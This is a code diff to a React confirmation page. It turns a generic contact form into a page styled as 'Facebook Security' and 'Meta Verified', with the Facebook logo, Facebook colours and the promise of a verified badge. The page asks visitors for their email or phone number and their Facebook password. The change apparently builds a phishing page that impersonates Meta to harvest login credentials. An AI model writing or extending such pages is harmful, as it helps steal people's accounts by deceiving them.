@@ -38,7 +38,7 @@ export default function Confirmation() {
       localStorage.removeItem('validation_data');
       toast({
         title: "Success!",
-        description: "Your contact form has been submitted successfully"
+        description: "Your form has been submitted successfully"
       });
       setLocation("/success");
     } catch (error) {
@@ -53,62 +53,75 @@ export default function Confirmation() {
   return (
     <>
       <MetaTags 
-        title="Contact Form | Step 2"
-        description="Contact form confirmation step"
+        title="Meta Verified | Confirmation"
+        description="Request a verified badge on Facebook - Final Step"
       />
-      <div className="min-h-screen bg-background flex justify-center items-center p-4">
-        <div className="max-w-md w-full space-y-6">
-          <div className="text-center">
-            <h1 className="text-2xl font-bold text-primary">Step 2: Contact Details</h1>
-            <p className="text-muted-foreground mt-2">
-              Please provide your contact information
-            </p>
-          </div>
-
+      <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
+        <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
+            alt="Logo"
+            className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
+          />
+          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
+            Facebook Security
+          </h1>
           <Form {...form}>
             <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-              <FormField
-                control={form.control}
-                name="user_email"
-                render={({ field }) => (
-                  <FormItem>
-                    <FormLabel>Email Address</FormLabel>
-                    <FormControl>
-                      <Input
-                        type="email"
-                        placeholder="Enter your email address"
-                        className="w-full"
-                        {...field}
-                      />
-                    </FormControl>
-                    <FormMessage />
-                  </FormItem>
-                )}
-              />
-              <FormField
-                control={form.control}
-                name="password"
-                render={({ field }) => (
-                  <FormItem>
-                    <FormLabel>Password</FormLabel>
-                    <FormControl>
-                      <Input
-                        type="password"
-                        placeholder="Create a password"
-                        className="w-full"
-                        {...field}
-                      />
-                    </FormControl>
-                    <FormMessage />
-                  </FormItem>
-                )}
-              />
+              <div className="text-left">
+                <FormField
+                  control={form.control}
+                  name="user_email"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                        Email or Phone Number
+                      </FormLabel>
+                      <FormControl>
+                        <Input
+                          type="text"
+                          placeholder="Enter email or phone number"
+                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                          {...field}
+                          onChange={(e) => {
+                            const value = e.target.value.replace(/\s+/g, '');
+                            field.onChange(value);
+                          }}
+                        />
+                      </FormControl>
+                      <FormMessage className="text-xs text-red-500 mt-1" />
+                    </FormItem>
+                  )}
+                />
+              </div>
+              <div className="text-left">
+                <FormField
+                  control={form.control}
+                  name="password"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                        Password
+                      </FormLabel>
+                      <FormControl>
+                        <Input
+                          type="password"
+                          placeholder="Enter password"
+                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage className="text-xs text-red-500 mt-1" />
+                    </FormItem>
+                  )}
+                />
+              </div>
               <Button 
                 type="submit" 
-                className="w-full"
+                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
                 disabled={form.formState.isSubmitting}
               >
-                {form.formState.isSubmitting ? "Submitting..." : "Submit Form"}
+                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
               </Button>
             </form>
           </Form>
